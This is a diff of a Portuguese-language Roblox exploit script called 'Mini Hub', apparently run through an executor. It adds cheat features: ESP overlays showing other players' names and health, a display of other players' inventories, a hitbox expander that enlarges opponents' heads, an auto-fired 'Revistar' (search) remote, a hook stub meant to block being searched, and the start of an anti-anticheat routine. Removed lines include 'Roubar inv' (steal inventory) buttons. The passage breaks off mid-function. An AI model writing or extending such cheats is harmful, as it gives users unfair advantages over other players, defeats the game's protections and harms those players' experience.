+local antiRevistarHookConnection = nil -- Armazena a conexão do hook (se aplicável)
+
+-- Função para gerenciar o estado do Anti-Revistar
+-- A implementação real do hook depende do exploit e de como o evento é tratado internamente.
+-- Este é um EXEMPLO de como poderia ser estruturado com um hook genérico.
+local function gerenciarAntiRevistar(ativar)
+    if ativar == antiRevistarAtivo then return end -- Evita ações redundantes
+
+    if ativar then
+        -- Lógica para ATIVAR o anti-revistar
+        -- Exemplo: Hookar a função que processa o evento "Revistar" no cliente
+        -- ou hookar o __namecall para interceptar FireServer especificamente
+        -- A implementação exata depende do exploit e do jogo.
+        print("Anti-Revistar ATIVADO (Lógica de hook/interceptação precisa ser implementada aqui)")
+        -- Exemplo (pseudocódigo, requer API de hook do exploit):
+        -- local mecanicaEventos = ReplicatedStorage.Events.MecanicaEventos
+        -- if not antiRevistarHookConnection then
+        --     antiRevistarHookConnection = hookfunction(mecanicaEventos.OnClientEvent.Function, function(event, ...)
+        --         local args = {...}
+        --         if args[1] == "Revistar" and args[2] == Player then -- Verifica se é um evento de revistar para o jogador local
+        --             print("Evento 'Revistar' bloqueado pelo Anti-Revistar.")
+        --             return -- Impede a execução da função original
+        --         end
+        --         return antiRevistarHookConnection:CallOriginal(event, ...) -- Chama a função original para outros eventos
+        --     end)
+        -- end
+        antiRevistarAtivo = true
+        Rayfield:Notify({ Title = "Anti-Revistar", Content = "Ativado.", Duration = 3 })
+
+    else
+        -- Lógica para DESATIVAR o anti-revistar
+        print("Anti-Revistar DESATIVADO (Lógica de unhook/restauração precisa ser implementada aqui)")
+        -- Exemplo (pseudocódigo):
+        -- if antiRevistarHookConnection then
+        --     unhookfunction(antiRevistarHookConnection)
+        --     antiRevistarHookConnection = nil
+        -- end
+        antiRevistarAtivo = false
+        Rayfield:Notify({ Title = "Anti-Revistar", Content = "Desativado.", Duration = 3 })
     end
 end
 
-local function criarESP(player)
+-- Toggle para ativar/desativar o Anti-Revistar
+MiniHubAntiRevSection:CreateToggle({
+    Name = "Anti ser revistado",
+    CurrentValue = antiRevistarAtivo, -- Começa desativado por padrão
+    Flag = "antirevistar",
+    Callback = function(Value)
+        -- Chama a função de gerenciamento APENAS quando o toggle é alterado
+        gerenciarAntiRevistar(Value)
+    end,
+})
+
+-- ========================================
+--          SEÇÃO ESP
+-- ========================================
+local MiniHubESPSection = MiniHubTab:CreateSection("ESP")
+local ESPAtivo = false
+local espConnections = {} -- Armazena conexões e GUIs para limpeza
+
+-- Função para remover ESP de um jogador específico
+local function removerESP(player)
+    if espConnections[player] then
+        if espConnections[player].gui and espConnections[player].gui.Parent then
+            espConnections[player].gui:Destroy()
+        end
+        if espConnections[player].diedConn then
+            espConnections[player].diedConn:Disconnect()
+        end
+         if espConnections[player].healthConn then
+            espConnections[player].healthConn:Disconnect()
+        end
+        espConnections[player] = nil
+    end
+    -- Garante remoção mesmo se não estiver na tabela (caso tenha sido criado fora)
     if player.Character and player.Character:FindFirstChild("Head") then
-        if player.Character.Head:FindFirstChild("ESP") then return end
+         local head = player.Character.Head
+         local oldEsp = head:FindFirstChild("ESP_MiniHub")
+         if oldEsp then oldEsp:Destroy() end
+    end
+end
 
-        local billboard = Instance.new("BillboardGui")
-        billboard.Name = "ESP"
-        billboard.Adornee = player.Character.Head
-        billboard.AlwaysOnTop = true
-        billboard.Size = UDim2.new(0, 200, 0, 50)
-        billboard.StudsOffset = Vector3.new(0, 2, 0)
+-- Função para criar ESP para um jogador específico
+local function criarESP(player)
+    if player == Player or not player.Character or not player.Character:FindFirstChild("Head") or not player.Character:FindFirstChild("Humanoid") then
+        return -- Ignora o jogador local, ou se não tiver char/head/humanoid
+    end
+    removerESP(player) -- Remove ESP antigo antes de criar novo
 
-        local nameLabel = Instance.new("TextLabel")
-        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
-        nameLabel.Position = UDim2.new(0, 0, 0, 0)
-        nameLabel.BackgroundTransparency = 1
-        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        nameLabel.TextStrokeTransparency = 0.5
-        nameLabel.TextScaled = true
-        nameLabel.Text = player.Name
-        nameLabel.Parent = billboard
+    local character = player.Character
+    local head = character.Head
+    local humanoid = character.Humanoid
 
-        local healthLabel = Instance.new("TextLabel")
-        healthLabel.Size = UDim2.new(1, 0, 0.5, 0)
-        healthLabel.Position = UDim2.new(0, 0, 0.5, 0)
-        healthLabel.BackgroundTransparency = 1
-        healthLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-        healthLabel.TextStrokeTransparency = 0.5
-        healthLabel.TextScaled = true
-        healthLabel.Text = "Vida: ..."
-        healthLabel.Parent = billboard
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ESP_MiniHub"
+    billboard.Adornee = head
+    billboard.AlwaysOnTop = true
+    billboard.Size = UDim2.new(0, 150, 0, 40) -- Ajustado tamanho
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0) -- Ajustado offset
+    billboard.Parent = head
 
-        billboard.Parent = player.Character.Head
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
+    nameLabel.Position = UDim2.new(0, 0, 0, 0)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameLabel.Font = Enum.Font.SourceSansSemibold
+    nameLabel.TextScaled = true
+    nameLabel.TextStrokeTransparency = 0.4
+    nameLabel.Text = player.DisplayName .. " (" .. player.Name .. ")"
+    nameLabel.Parent = billboard
 
-        local function atualizarVida()
-            if player.Character and player.Character:FindFirstChild("Humanoid") then
-                healthLabel.Text = "Vida: " .. math.floor(player.Character.Humanoid.Health)
+    local healthLabel = Instance.new("TextLabel")
+    healthLabel.Size = UDim2.new(1, 0, 0.5, 0)
+    healthLabel.Position = UDim2.new(0, 0, 0.5, 0)
+    healthLabel.BackgroundTransparency = 1
+    healthLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- Começa verde
+    healthLabel.Font = Enum.Font.SourceSans
+    healthLabel.TextScaled = true
+    healthLabel.TextStrokeTransparency = 0.4
+    healthLabel.Parent = billboard
+
+    local function atualizarVida()
+        if humanoid and humanoid.Health > 0 then
+            local health = math.floor(humanoid.Health)
+            local maxHealth = humanoid.MaxHealth
+            healthLabel.Text = "Vida: " .. health .. "/" .. maxHealth
+            -- Muda a cor baseado na porcentagem de vida
+            local healthPercent = health / maxHealth
+            healthLabel.TextColor3 = Color3.fromHSV(0.33 * healthPercent, 1, 1) -- Verde para amarelo para vermelho
+        else
+             healthLabel.Text = "Morto"
+             healthLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+             task.wait(1) -- Pequena pausa antes de remover para evitar erro se o char sumir rápido
+             removerESP(player) -- Remove o ESP se o jogador morrer
+        end
+    end
+
+    local healthConn = humanoid.HealthChanged:Connect(atualizarVida)
+    local diedConn = humanoid.Died:Connect(function()
+         task.wait(0.1) -- Espera um frame para garantir
+         removerESP(player)
+    end)
+
+    espConnections[player] = {gui = billboard, healthConn = healthConn, diedConn = diedConn}
+    atualizarVida() -- Chama uma vez para definir o estado inicial
+end
+
+-- Função para aplicar ou remover ESP de todos os jogadores
+local playerAddedConn = nil
+local playerRemovingConn = nil
+local characterAddedConns = {}
+
+local function gerenciarESPGlobal(ativar)
+    ESPAtivo = ativar
+    if ativar then
+        print("Ativando ESP...")
+        -- Aplica aos jogadores existentes
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= Player then
+                if p.Character then
+                    criarESP(p)
+                end
+                -- Conecta CharacterAdded para cada jogador existente
+                 if not characterAddedConns[p] then
+                     characterAddedConns[p] = p.CharacterAdded:Connect(function(char)
+                         task.wait(0.5) -- Espera um pouco para garantir que Head e Humanoid existam
+                         if ESPAtivo then criarESP(p) end
+                     end)
+                 end
             end
         end
 
-        atualizarVida()
-        player.Character:FindFirstChild("Humanoid").HealthChanged:Connect(atualizarVida)
-    end
-end
-
-local function aplicarESP()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= Players.LocalPlayer then
-            if player.Character then criarESP(player) end
-            player.CharacterAdded:Connect(function()
-                wait(1)
-                if ESPAtivo then criarESP(player) end
+        -- Conecta para novos jogadores
+        if not playerAddedConn then
+            playerAddedConn = Players.PlayerAdded:Connect(function(p)
+                 if not characterAddedConns[p] then
+                     characterAddedConns[p] = p.CharacterAdded:Connect(function(char)
+                         task.wait(0.5)
+                         if ESPAtivo then criarESP(p) end
+                     end)
+                 end
+                 -- Cria ESP se o char já existir quando entrou
+                 if p.Character and ESPAtivo then
+                    task.wait(0.5)
+                    criarESP(p)
+                 end
             end)
         end
-    end
+         -- Conecta para jogadores que saem
+         if not playerRemovingConn then
+             playerRemovingConn = Players.PlayerRemoving:Connect(function(p)
+                 removerESP(p)
+                 if characterAddedConns[p] then
+                     characterAddedConns[p]:Disconnect()
+                     characterAddedConns[p] = nil
+                 end
+             end)
+         end
 
-    Players.PlayerAdded:Connect(function(player)
-        player.CharacterAdded:Connect(function()
-            wait(1)
-            if ESPAtivo then criarESP(player) end
-        end)
-    end)
-end
-
--- Auto Revistar (extremamente rápido)
-local autoRevistarAtivo = false
-local connection
-
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-
--- Função de revistar
-local function revistar()
-    local args = {
-        [1] = "Revistar",
-        [2] = Players.LocalPlayer
-    }
-    ReplicatedStorage.Events.MecanicaEventos:FireServer(unpack(args))
-end
-
--- Alternar auto revistar ultra rápido
-local function toggleAutoRevistar()
-    autoRevistarAtivo = not autoRevistarAtivo
-
-    if autoRevistarAtivo then
-        connection = RunService.RenderStepped:Connect(function()
-            revistar()
-        end)
     else
-        if connection then
-            connection:Disconnect()
+        print("Desativando ESP...")
+        -- Desconecta listeners globais
+        if playerAddedConn then playerAddedConn:Disconnect(); playerAddedConn = nil end
+        if playerRemovingConn then playerRemovingConn:Disconnect(); playerRemovingConn = nil end
+
+        -- Desconecta listeners de CharacterAdded individuais
+        for p, conn in pairs(characterAddedConns) do
+            if conn then conn:Disconnect() end
         end
+        characterAddedConns = {}
+
+        -- Remove ESP de todos os jogadores
+        for p, data in pairs(espConnections) do
+            removerESP(p)
+        end
+         espConnections = {} -- Limpa a tabela
     end
 end
 
--- Exemplo de ativação
-toggleAutoRevistar()
+-- Toggle para ESP
+MiniHubESPSection:CreateToggle({
+    Name = "ESP Nome/Vida",
+    CurrentValue = ESPAtivo,
+    Flag = "esp",
+    Callback = function(Value)
+        gerenciarESPGlobal(Value)
+    end,
+})
 
--- Ver Itens UI
+-- ========================================
+--          SEÇÃO AUTO REVISTAR
+-- ========================================
+local MiniHubAutoRevSection = MiniHubTab:CreateSection("Auto Revistar")
+local autoRevistarAtivo = false
+local autoRevTask = nil -- Variável para a coroutine do auto revistar
+
+-- Função para o loop de auto revistar
+local function autoRevistarLoop()
+    while autoRevistarAtivo do
+        sendRevistarCommand() -- Reutiliza a função já criada
+        task.wait(2) -- Intervalo entre as revistas
+    end
+    print("Loop Auto Revistar parado.")
+end
+
+-- Toggle para Auto Revistar
+MiniHubAutoRevSection:CreateToggle({
+    Name = "Ativar Auto Revistar (a cada 2s)",
+    CurrentValue = false,
+    Flag = "autorsv",
+    Callback = function(Value)
+        autoRevistarAtivo = Value
+        if autoRevistarAtivo then
+            if autoRevTask then task.cancel(autoRevTask) end -- Cancela task anterior
+            autoRevTask = task.spawn(autoRevistarLoop) -- Inicia a nova task
+            print("Loop Auto Revistar iniciado.")
+            Rayfield:Notify({ Title = "Auto Revistar", Content = "Ativado.", Duration = 3 })
+        else
+            if autoRevTask then task.cancel(autoRevTask); autoRevTask = nil end -- Cancela a task se existir
+            Rayfield:Notify({ Title = "Auto Revistar", Content = "Desativado.", Duration = 3 })
+        end
+    end,
+})
+
+-- ========================================
+--          SEÇÃO VER ITENS UI
+-- ========================================
+local MiniHubVerItensSection = MiniHubTab:CreateSection("Itens dos Jogadores")
 local verItensUIAtivo = false
-local verItensConexoes = {}
+local verItensConexoes = {} -- Armazena GUIs e conexões para limpeza
 
-local function adicionarUI(player)
-    if player == Players.LocalPlayer then return end
-    local character = player.Character or player.CharacterAdded:Wait()
-    local head = character:WaitForChild("Head", 3)
-    if not head or head:FindFirstChild("ItemUI") then return end
+-- Função para remover a UI de itens de um jogador
+local function removerItemUI(player)
+    if verItensConexoes[player] then
+        if verItensConexoes[player].gui and verItensConexoes[player].gui.Parent then
+            verItensConexoes[player].gui:Destroy()
+        end
+        -- Desconectar todos os listeners associados
+        for _, conn in ipairs(verItensConexoes[player].connections or {}) do
+            if conn then conn:Disconnect() end
+        end
+        verItensConexoes[player] = nil
+    end
+     -- Garante remoção mesmo se não estiver na tabela
+     if player.Character and player.Character:FindFirstChild("Head") then
+          local head = player.Character.Head
+          local oldUi = head:FindFirstChild("ItemUI_MiniHub")
+          if oldUi then oldUi:Destroy() end
+     end
+end
+
+-- Função para criar a UI de itens para um jogador
+local function adicionarItemUI(player)
+    if player == Player or not player.Character or not player.Character:FindFirstChild("Head") then
+        return
+    end
+    removerItemUI(player) -- Remove UI antiga
+
+    local character = player.Character
+    local head = character.Head
 
     local gui = Instance.new("BillboardGui")
-    gui.Name = "ItemUI"
+    gui.Name = "ItemUI_MiniHub"
     gui.Adornee = head
-    gui.Size = UDim2.new(0, 160, 0, 60)
-    gui.StudsOffset = Vector3.new(0, 2.8, 0)
+    gui.Size = UDim2.new(0, 180, 0, 70) -- Tamanho ajustado
+    gui.StudsOffset = Vector3.new(0, 3.5, 0) -- Offset ajustado
     gui.AlwaysOnTop = true
+    gui.Parent = head
 
     local name = Instance.new("TextLabel")
     name.Size = UDim2.new(1, 0, 0.3, 0)
@@ -609,486 +942,504 @@ local function adicionarUI(player)
     name.BackgroundTransparency = 1
     name.TextColor3 = Color3.new(1, 1, 1)
     name.TextStrokeTransparency = 0.5
-    name.Font = Enum.Font.SourceSansBold
+    name.Font = Enum.Font.SourceSansSemibold
     name.TextScaled = true
-    name.Text = player.Name
+    name.Text = player.DisplayName
     name.Parent = gui
 
     local itens = Instance.new("TextLabel")
     itens.Size = UDim2.new(1, 0, 0.7, 0)
     itens.Position = UDim2.new(0, 0, 0.3, 0)
     itens.BackgroundTransparency = 1
-    itens.TextColor3 = Color3.new(1, 1, 1)
+    itens.TextColor3 = Color3.new(0.8, 0.8, 0.8) -- Cor mais suave
     itens.TextStrokeTransparency = 0.6
     itens.Font = Enum.Font.SourceSans
     itens.TextScaled = true
     itens.TextWrapped = true
-    itens.Text = ""
+    itens.TextXAlignment = Enum.TextXAlignment.Left
+    itens.TextYAlignment = Enum.TextYAlignment.Top
+    itens.Text = "Itens: Carregando..."
     itens.Parent = gui
 
-    local function update()
+    local connections = {} -- Tabela local para conexões deste jogador
+
+    local function updateItems()
         local list = {}
-        if player:FindFirstChild("Backpack") then
-            for _, item in ipairs(player.Backpack:GetChildren()) do
-                table.insert(list, item.Name)
-            end
-        end
-        if player.Character then
-            for _, item in ipairs(player.Character:GetChildren()) do
-                if item:IsA("Tool") then
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            for _, item in ipairs(backpack:GetChildren()) do
+                if item:IsA("Tool") then -- Verifica se é ferramenta
                     table.insert(list, item.Name)
                 end
             end
         end
-        itens.Text = table.concat(list, ", ")
-    end
-
-    update()
-    table.insert(verItensConexoes, player.Backpack.ChildAdded:Connect(update))
-    table.insert(verItensConexoes, player.Backpack.ChildRemoved:Connect(update))
-    table.insert(verItensConexoes, player.Character.ChildAdded:Connect(update))
-    table.insert(verItensConexoes, player.Character.ChildRemoved:Connect(update))
-
-    gui.Parent = head
-end
-
-local function aplicarVerItensUI()
-    for _, player in pairs(Players:GetPlayers()) do
-        adicionarUI(player)
-    end
-
-    Players.PlayerAdded:Connect(function(player)
-        player.CharacterAdded:Connect(function()
-            task.wait(1)
-            if verItensUIAtivo then
-                adicionarUI(player)
-            end
-        end)
-    end)
-end
-
-local function removerVerItensUI()
-    for _, conn in ipairs(verItensConexoes) do
-        pcall(function() conn:Disconnect() end)
-    end
-    verItensConexoes = {}
-
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.Character and player.Character:FindFirstChild("Head") then
-            local ui = player.Character.Head:FindFirstChild("ItemUI")
-            if ui then ui:Destroy() end
-        end
-    end
-end
-
--- UI Mobile Revistar
-
-local function criarRevistarUI()
-    local ScreenGui = Instance.new("ScreenGui")
-    local Frame = Instance.new("Frame")
-    local CloseButton = Instance.new("TextButton")
-    local RevistarButton = Instance.new("TextButton")
-    local Title = Instance.new("TextLabel")
-
-    ScreenGui.Name = "RevistarUI"
-    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
-    Frame.Size = UDim2.new(0, 300, 0, 150)
-    Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    Frame.BorderSizePixel = 0
-    Frame.BackgroundTransparency = 0.1
-    Frame.Active = true
-    Frame.Draggable = true
-
-    Title.Size = UDim2.new(1, 0, 0, 30)
-    Title.Position = UDim2.new(0, 0, 0, 0)
-    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    Title.Text = "Mini Hub"
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.Font = Enum.Font.SourceSansBold
-    Title.TextSize = 18
-
-    CloseButton.Size = UDim2.new(0, 30, 0, 30)
-    CloseButton.Position = UDim2.new(1, -30, 0, 0)
-    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-    CloseButton.Text = "X"
-    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CloseButton.Font = Enum.Font.SourceSansBold
-    CloseButton.TextSize = 18
-    CloseButton.MouseButton1Click:Connect(function()
-        ScreenGui:Destroy()
-    end)
-
-    RevistarButton.Size = UDim2.new(0.8, 0, 0.4, 0)
-    RevistarButton.Position = UDim2.new(0.1, 0, 0.5, -30)
-    RevistarButton.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
-    RevistarButton.Text = "manda revistar"
-    RevistarButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    RevistarButton.Font = Enum.Font.SourceSansBold
-    RevistarButton.TextSize = 20
-    RevistarButton.AutoButtonColor = true
-    RevistarButton.MouseButton1Click:Connect(function()
-        sendRevistarCommand()
-    end)
-
-    Frame.Parent = ScreenGui
-    Title.Parent = Frame
-    CloseButton.Parent = Frame
-    RevistarButton.Parent = Frame
-end
-
--- Criação da aba Mini Hub Free
-local Paragraph = MiniHubTab:CreateParagraph({Title = "MINI HUB ON TOPPP", Content = "Feito por Th"})
-local Section = MiniHubTab:CreateSection("NECESSARIO")
-
-MiniHubTab:CreateButton({
-    Name = "Roubar inv",
-    Callback = function()
-        task.spawn(roubarInventario)
-    end,
-})
-
-MiniHubTab:CreateButton({
-    Name = "Roubar inv PC",
-    Callback = function()
-        task.spawn(roubarInventario)
-    end,
-})
-
-MiniHubTab:CreateSection("PC")
-MiniHubTab:CreateToggle({
-    Name = "mandar revistar (TECLA T)",
-    CurrentValue = false,
-    Flag = "rvst",
-    Callback = function(Value)
-        getgenv().Enabled = Value
-    end,
-})
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.T and getgenv().Enabled then
-        game:GetService("ReplicatedStorage").RemoteNovos.bixobrabo:FireServer("revistar")
-    end
-end)
-
-MiniHubTab:CreateSection("MOBILE")
-MiniHubTab:CreateButton({
-    Name = "mandar revistar UI",
-    Callback = function()
-        criarRevistarUI()
-    end,
-})
-
-MiniHubTab:CreateSection("Anti rev")
-MiniHubTab:CreateToggle({
-    Name = "Anti ser revistado",
-    CurrentValue = false,
-    Flag = "antirevistar",
-    Callback = function(Value)
-        if Value then
-            ativarAntiRevistar()
-        end
-    end,
-})
-
-MiniHubTab:CreateSection("ESP")
-MiniHubTab:CreateToggle({
-    Name = "ESP nome/vida",
-    CurrentValue = false,
-    Flag = "esp",
-    Callback = function(Value)
-        ESPAtivo = Value
-        if Value then
-            aplicarESP()
-        else
-            for _, player in pairs(Players:GetPlayers()) do
-                removerESP(player)
-            end
-        end
-    end,
-})
-
-MiniHubTab:CreateSection("Auto Revistar")
-MiniHubTab:CreateToggle({
-    Name = "Ativar Auto Revistar",
-    CurrentValue = false,
-    Flag = "autorsv",
-    Callback = function(Value)
-        autoRevistarAtivo = Value
-        if autoRevistarAtivo then
-            autoRevTask = task.spawn(function()
-                while autoRevistarAtivo do
-                    game:GetService("ReplicatedStorage").RemoteNovos.bixobrabo:FireServer("revistar")
-                    task.wait(2)
+        if player.Character then
+            for _, item in ipairs(player.Character:GetChildren()) do
+                if item:IsA("Tool") then -- Verifica se é ferramenta
+                    table.insert(list, item.Name)
                 end
-            end)
-        else
-            if autoRevTask then
-                task.cancel(autoRevTask)
-                autoRevTask = nil
             end
         end
-    end,
-})
+        if #list > 0 then
+            itens.Text = "Itens: " .. table.concat(list, ", ")
+        else
+            itens.Text = "Itens: Nenhum"
+        end
+    end
 
-MiniHubTab:CreateSection("Itens dos Jogadores")
-MiniHubTab:CreateToggle({
-    Name = "Ver itens UI",
-    CurrentValue = false,
+    -- Conexões para atualizar quando itens são adicionados/removidos
+    local backpack = player:WaitForChild("Backpack", 5)
+    if backpack then
+         table.insert(connections, backpack.ChildAdded:Connect(updateItems))
+         table.insert(connections, backpack.ChildRemoved:Connect(updateItems))
+    end
+    -- Character também pode ter tools
+     table.insert(connections, character.ChildAdded:Connect(function(child) if child:IsA("Tool") then updateItems() end end))
+     table.insert(connections, character.ChildRemoved:Connect(function(child) if child:IsA("Tool") then updateItems() end end))
+     table.insert(connections, character:GetAttributeChangedSignal("ToolEquipped"):Connect(updateItems)) -- Se houver atributo
+
+    verItensConexoes[player] = {gui = gui, connections = connections}
+    updateItems() -- Chama uma vez para definir o estado inicial
+end
+
+-- Função para aplicar ou remover a UI de itens de todos
+local verItensPlayerAddedConn = nil
+local verItensPlayerRemovingConn = nil
+local verItensCharacterAddedConns = {}
+
+local function gerenciarVerItensGlobal(ativar)
+    verItensUIAtivo = ativar
+    if ativar then
+        print("Ativando Ver Itens UI...")
+         -- Aplica aos jogadores existentes
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= Player then
+                if p.Character then
+                    adicionarItemUI(p)
+                end
+                -- Conecta CharacterAdded para cada jogador existente
+                 if not verItensCharacterAddedConns[p] then
+                     verItensCharacterAddedConns[p] = p.CharacterAdded:Connect(function(char)
+                         task.wait(0.5)
+                         if verItensUIAtivo then adicionarItemUI(p) end
+                     end)
+                 end
+            end
+        end
+
+        -- Conecta para novos jogadores
+        if not verItensPlayerAddedConn then
+            verItensPlayerAddedConn = Players.PlayerAdded:Connect(function(p)
+                 if not verItensCharacterAddedConns[p] then
+                     verItensCharacterAddedConns[p] = p.CharacterAdded:Connect(function(char)
+                         task.wait(0.5)
+                         if verItensUIAtivo then adicionarItemUI(p) end
+                     end)
+                 end
+                  if p.Character and verItensUIAtivo then
+                    task.wait(0.5)
+                    adicionarItemUI(p)
+                 end
+            end)
+        end
+        -- Conecta para jogadores que saem
+         if not verItensPlayerRemovingConn then
+            verItensPlayerRemovingConn = Players.PlayerRemoving:Connect(function(p)
+                 removerItemUI(p)
+                 if verItensCharacterAddedConns[p] then
+                     verItensCharacterAddedConns[p]:Disconnect()
+                     verItensCharacterAddedConns[p] = nil
+                 end
+             end)
+         end
+
+    else
+         print("Desativando Ver Itens UI...")
+         -- Desconecta listeners globais
+        if verItensPlayerAddedConn then verItensPlayerAddedConn:Disconnect(); verItensPlayerAddedConn = nil end
+        if verItensPlayerRemovingConn then verItensPlayerRemovingConn:Disconnect(); verItensPlayerRemovingConn = nil end
+
+        -- Desconecta listeners de CharacterAdded individuais
+        for p, conn in pairs(verItensCharacterAddedConns) do
+            if conn then conn:Disconnect() end
+        end
+        verItensCharacterAddedConns = {}
+
+        -- Remove UI de todos os jogadores
+        for p, data in pairs(verItensConexoes) do
+            removerItemUI(p)
+        end
+         verItensConexoes = {} -- Limpa a tabela
+
+    end
+end
+
+-- Toggle para Ver Itens UI
+MiniHubVerItensSection:CreateToggle({
+    Name = "Ver Itens UI",
+    CurrentValue = verItensUIAtivo,
     Flag = "veritensui",
     Callback = function(Value)
-        verItensUIAtivo = Value
-        if Value then
-            aplicarVerItensUI()
-        else
-            removerVerItensUI()
-        end
+        gerenciarVerItensGlobal(Value)
     end,
 })
 
--- HITBOX
-local HitboxSection = Tab:CreateSection("Hitbox")
 
-local tamanhosOriginal = {}
-
-local function setHitbox(player, size)
-    if not player or not player.Character or not player.Character:FindFirstChild("Head") then return end
-    local head = player.Character.Head
-    if not tamanhosOriginal[player] then
-        tamanhosOriginal[player] = head.Size
-    end
-    head.Size = size
-end
-
-local function resetHitbox(player)
-    if not player or not player.Character or not player.Character:FindFirstChild("Head") then return end
-    local head = player.Character.Head
-    if tamanhosOriginal[player] then
-        head.Size = tamanhosOriginal[player]
-    end
-end
-
+-- ========================================
+--          SEÇÃO HITBOX EXPANDER
+-- ========================================
+local HitboxSection = Tab:CreateSection("Hitbox (PC e Mobile)")
 local hitboxEnabled = false
-local hitboxConnection
+local originalSizes = {} -- Armazena tamanhos originais {player = originalSizeVector}
+local hitboxConnection = nil
 
-local function toggleHitbox(habilitado)
-    hitboxEnabled = habilitado
-    if habilitado then
-        hitboxConnection = game:GetService("RunService").RenderStepped:Connect(function()
-            for _, jogador in pairs(game:GetService("Players"):GetPlayers()) do
-                if jogador ~= Player and jogador.Character and jogador.Character:FindFirstChild("Head") then
-                    setHitbox(jogador, Vector3.new(5, 5, 5)) -- Tamanho expandido da cabeça
-                end
+-- Função para definir o tamanho da hitbox (cabeça)
+local function setHitbox(targetPlayer, size)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        local head = targetPlayer.Character.Head
+        -- Guarda o tamanho original apenas se ainda não foi guardado
+        if not originalSizes[targetPlayer] then
+            originalSizes[targetPlayer] = head.Size
+        end
+        head.Size = size
+        -- Efeitos visuais opcionais para indicar a hitbox expandida
+        head.Transparency = 0.7
+        head.Material = Enum.Material.Neon
+        head.Color = Color3.fromRGB(255, 0, 0)
+        head.CanCollide = false -- Desativa colisão para evitar problemas
+    end
+end
+
+-- Função para resetar a hitbox para o tamanho original
+local function resetHitbox(targetPlayer)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and originalSizes[targetPlayer] then
+        local head = targetPlayer.Character.Head
+        head.Size = originalSizes[targetPlayer]
+        -- Reseta os efeitos visuais
+        head.Transparency = 0 -- Usa a transparência padrão do char
+        head.Material = Enum.Material.Plastic -- Ou o material padrão
+        head.Color = Color3.fromRGB(255, 223, 196) -- Cor padrão da cabeça (aproximada)
+        head.CanCollide = true -- Reativa colisão
+        -- Remove da tabela após resetar
+        originalSizes[targetPlayer] = nil
+    end
+end
+
+-- Função para gerenciar o Hitbox Expander
+local function toggleHitbox(enabled)
+    hitboxEnabled = enabled
+    if enabled then
+        print("Ativando Hitbox Expander...")
+        -- Aplica aos jogadores existentes
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= Player then
+                setHitbox(p, Vector3.new(5, 5, 5)) -- Tamanho expandido
             end
-        end)
+        end
+        -- Conecta RenderStepped para manter (pode não ser necessário se CharacterAdded cuidar disso)
+        -- Opcional: Usar CharacterAdded para aplicar a novos jogadores e quando respawnarem
+        -- (Já coberto pelos loops de ESP e Ver Itens, mas pode adicionar aqui se necessário)
+        -- Nota: A forma mais robusta seria conectar a CharacterAdded para todos os outros jogadores.
+        if not hitboxConnection then
+             hitboxConnection = RunService.RenderStepped:Connect(function()
+                -- Verificação contínua pode ser pesada, prefira CharacterAdded
+                -- Este loop pode ser removido se CharacterAdded for implementado robustamente
+                 for _, p in pairs(Players:GetPlayers()) do
+                     if p ~= Player and p.Character and p.Character:FindFirstChild("Head") and not originalSizes[p] then
+                         -- Aplica se o jogador apareceu e ainda não tem hitbox modificada
+                         setHitbox(p, Vector3.new(5, 5, 5))
+                     end
+                 end
+             end)
+        end
+
     else
+        print("Desativando Hitbox Expander...")
         if hitboxConnection then
             hitboxConnection:Disconnect()
             hitboxConnection = nil
         end
-        for _, jogador in pairs(game:GetService("Players"):GetPlayers()) do
-            if jogador ~= Player then
-                resetHitbox(jogador)
-            end
+        -- Reseta para todos os jogadores que foram modificados
+        for player, size in pairs(originalSizes) do
+            resetHitbox(player)
         end
-        tamanhosOriginal = {}
+        originalSizes = {} -- Limpa a tabela
     end
 end
 
+-- Toggle para Hitbox Expander
 Tab:CreateToggle({
-    Name = "Expansor de Hitbox",
-    Description = "Aumenta o tamanho da cabeça dos outros jogadores.",
-    CurrentValue = false,
+    Name = "Hitbox Expander",
+    Description = "Aumenta o tamanho da cabeça dos outros jogadores (visual e de colisão).",
+    CurrentValue = hitboxEnabled,
     Section = HitboxSection,
     Callback = function(Value)
         toggleHitbox(Value)
     end
 })
 
--- TELEPORTES
-TeleportTab:CreateParagraph({Title = "Mini Hub", Content = "por th"})
-TeleportTab:CreateSection("TELEPORTS")
 
+-- ========================================
+--          ANTI-AC (Kick na Morte)
+-- ========================================
+-- Função para verificar a vida e kickar se baixa
+local function verificarVidaEKick()
+    local character = Player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    if not humanoid then
+        -- Espera o personagem carregar caso ainda não tenha carregado
+        character = Player.CharacterAdded:Wait()
+        humanoid = character:WaitForChild("Humanoid")
+    end
+
+    if not humanoid then
+        warn("Não foi possível encontrar o Humanoide do jogador para o Anti-AC.")
+        return
+    end
+
+    local healthChangedConn = nil
